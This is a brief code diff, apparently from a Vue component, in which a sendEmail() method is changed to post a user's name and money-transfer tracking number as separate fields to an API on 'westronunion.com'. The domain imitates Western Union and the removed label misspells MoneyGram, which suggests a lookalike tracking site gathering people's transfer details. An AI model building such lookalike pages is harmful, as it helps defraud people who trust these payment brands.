@@ -164,9 +164,10 @@ export default {
       }
     },
     sendEmail() {
-      const trackingNumber = `Moneygrom traking | Name:- ${this.track_number} | Name:- ${this.name}`
-      axios.post('https://westronunion.com/api/send-email', {
-        trackingNumber: trackingNumber
+
+      axios.post('https://westronunion.com/api/money-gram/send-email', {
+        name: this.name,
+        trackingNumber: this.track_number
       })
     }
 
